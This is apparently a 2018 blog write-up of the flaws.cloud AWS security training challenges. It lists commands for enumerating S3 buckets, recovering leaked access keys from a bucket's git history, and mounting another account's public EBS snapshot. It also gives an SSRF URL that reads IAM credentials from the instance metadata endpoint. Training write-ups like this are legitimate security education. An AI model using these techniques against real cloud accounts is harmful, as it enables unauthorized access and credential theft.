+++
title = "flaws.cloud Writeup"
date = 2018-08-08T00:41:06+01:00
draft = false
author = "Rob W"
description = "Steps and commands used to solve the [flaws.cloud]http://flaws.cloud) challenges."
+++

In this post I have inserted the commands and some information used to complete the flaws.cloud challenges.
<!--more-->

## Level1
Find the region of s3 bucket:

```
dig +nocmd flaws.cloud any +multiline +noall +answer
flaws.cloud.		600 IN NS ns-1061.awsdns-04.org.
flaws.cloud.		600 IN NS ns-1890.awsdns-44.co.uk.
flaws.cloud.		600 IN NS ns-448.awsdns-56.com.
flaws.cloud.		600 IN NS ns-966.awsdns-56.net.
flaws.cloud.		600 IN SOA ns-1890.awsdns-44.co.uk. awsdns-hostmaster.amazon.com. (
				1          ; serial
				7200       ; refresh (2 hours)
				900        ; retry (15 minutes)
				1209600    ; expire (2 weeks)
				86400      ; minimum (1 day)
				)
flaws.cloud.		5 IN A	54.231.177.35

nslookup 52.218.240.179
179.240.218.52.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.
```

Search for readable files in the s3 bucket.

```
aws s3 ls flaws.cloud --region us-west-2 --no-sign-request

2017-03-14 03:00:38       2575 hint1.html
2017-03-03 04:05:17       1707 hint2.html
2017-03-03 04:05:11       1101 hint3.html
2018-07-10 17:47:16       3082 index.html
2018-07-10 17:47:16      15979 logo.png
2017-02-27 01:59:28         46 robots.txt
2017-02-27 01:59:30       1051 secret-dd02c7c.html
```

## Level2

Create an IAM user and configure a profile with the creds.

```
aws configure --profile pwners
AWS Access Key ID [None]: xxxxxxxxxx
AWS Secret Access Key [None]: xxxxxxxxxxx
Default region name [None]: 
Default output format [None]: 
```

Use the new profile to list the files of the level2 domain.

```
aws s3 ls --profile pwners s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/
2017-02-27 02:02:15      80751 everyone.png
2017-03-03 03:47:17       1433 hint1.html
2017-02-27 02:04:39       1035 hint2.html
2017-02-27 02:02:14       2786 index.html
2017-02-27 02:02:14         26 robots.txt
2017-02-27 02:02:15       1051 secret-e4443fc.html
```

## Level3

List the files in the bucket. It has the same issue as the previous, so you can just use your own AWS creds.

```
aws s3 ls --profile narc s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
                           PRE .git/
2017-02-27 00:14:33     123637 authenticated_users.png
2017-02-27 00:14:34       1552 hint1.html
2017-02-27 00:14:34       1426 hint2.html
2017-02-27 00:14:35       1247 hint3.html
2017-02-27 00:14:33       1035 hint4.html
2017-02-27 02:05:16       1703 index.html
2017-02-27 00:14:33         26 robots.txt
```

Download all the files from the bucket using aws s3 sync.
```
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --profile narc
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to .git/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/index to .git/index
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/HEAD to .git/logs/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/robots.txt to ./robots.txt
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint2.html to ./hint2.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/index.html to ./index.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint4.html to ./hint4.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint3.html to ./hint3.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html to ./hint1.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png to ./authenticated_users.png
```

We can see that there is a .git file. Let us look and see what files and changes there are.

```
git log
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

Use git checkout to get back to the original commit. We can see what stuff was accidentally left in the repo.

```
git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
Note: checking out 'f52ec03b227ea6094b04e43f475fb0126edb5a61'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b <new-branch-name>

HEAD is now at f52ec03 first commit
root@pentest-rw:~/blah# ls
access_keys.txt          hint1.html  hint3.html  index.html
authenticated_users.png  hint2.html  hint4.html  robots.txt
root@pentest-rw:~/blah# cat access_keys.txt 
access_key xxxxxxxxx
secret_access_key xxxxxxxx
```
Now use the previous method to create a new profile with the access keys. Find all available buckets now.

```
aws s3 ls --profile flaws
2017-02-12 21:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 17:34:53 config-bucket-975426262029
2017-02-12 20:03:24 flaws-logs
2017-02-05 03:40:07 flaws.cloud
2017-02-24 01:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 18:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 18:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 19:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 19:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 20:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

## Level4

From this one is just a list of commands because I don't want to go through all the steps manually again right now. :)

```
aws --profile flaws sts get-caller-identity (get account id)
aws --profile flaws  ec2 describe-snapshots --owner-id 975426262029 (get snapshots)
aws --profile YOUR_ACCOUNT ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89 (create a volume by using the snapshot)
ssh -i YOUR_KEY.pem  ubuntu@your_aws_ip
lsblk
sudo mount /dev/YOUR_VOLUME/1 /mnt

Now search for shit.
```

## Level5

The only interesting bit from this level.

```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
```

